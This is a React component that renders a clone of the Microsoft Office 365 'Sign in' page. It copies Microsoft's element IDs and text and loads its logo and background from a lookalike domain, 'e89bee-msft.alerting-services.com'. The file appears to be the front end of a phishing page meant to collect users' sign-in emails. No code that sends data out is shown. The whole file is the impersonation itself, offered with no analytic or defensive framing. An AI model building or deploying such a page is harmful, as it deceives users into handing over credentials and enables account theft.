"use client";

function OfficeLoginPage() {
  return (
    <div 
      className="min-h-screen bg-cover bg-center font-sans text-sm text-gray-900" 
      style={{ backgroundImage: "url('https://e89bee-msft.alerting-services.com/office365code/49_7916a894ebde7d29c2cc29b267f1299f.jpg')" }}
    >
      <div className="flex min-h-screen items-center justify-center p-4">
        <div className="w-full max-w-[440px] bg-white p-6 sm:p-12 shadow-md">
          <img 
            src="https://e89bee-msft.alerting-services.com/microsoft/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" 
            alt="Microsoft" 
            className="h-6 mb-6"
          />
          <h1 className="text-2xl font-semibold mb-1">Sign in</h1>

          <div className="my-4">
            <input 
              type="email" 
              id="i0116" 
              className="w-full px-0 py-1 border-b-2 border-gray-500 focus:border-blue-600 focus:outline-none placeholder-gray-500"
              placeholder="Email, phone, or Skype"
              aria-label="Enter your email, phone, or Skype."
            />
          </div>

          <div className="mb-6 text-xs space-y-2">
            <p>
              No account?{' '}
              <a href="#" className="text-blue-600 hover:underline">
                Create one!
              </a>
            </p>
            <p>
              <a href="#" className="text-blue-600 hover:underline">
                Can't access your account?
              </a>
            </p>
          </div>

          <div className="flex justify-end">
            <button 
              id="idSIButton9" 
              className="bg-[#0067b8] text-white px-8 py-2 hover:bg-[#005da6] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#0067b8]"
            >
              Next
            </button>
          </div>
        </div>
      </div>
      <footer className="fixed bottom-0 right-0 p-4 text-xs text-white bg-black bg-opacity-20">
        <a href="#" className="mr-4 hover:underline">Terms of use</a>
        <a href="#" className="mr-4 hover:underline">Privacy & cookies</a>
        <a href="#" className="hover:underline">...</a>
      </footer>
    </div>
  );
}

export default function Home() {
  return <OfficeLoginPage />;
}